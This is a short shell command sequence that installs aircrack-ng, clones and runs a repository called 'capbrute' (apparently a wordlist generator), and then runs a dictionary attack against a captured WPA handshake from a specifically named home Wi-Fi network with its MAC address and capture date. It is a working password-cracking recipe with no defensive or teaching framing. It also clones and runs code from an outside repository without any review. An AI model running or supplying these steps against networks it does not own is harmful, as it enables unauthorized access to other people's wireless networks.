sudo apt update -y
sudo apt install python3 aircrack-ng wget -y
git clone https://github.com/JamalNiga/capbrute
cd capbrute
python3 hy.py
sudo aircrack-ng -w pass.txt handshake_inwiHome4GBB7753_42-F9-22-53-77-BD_2023-09-24T23-29-20.cap
#-
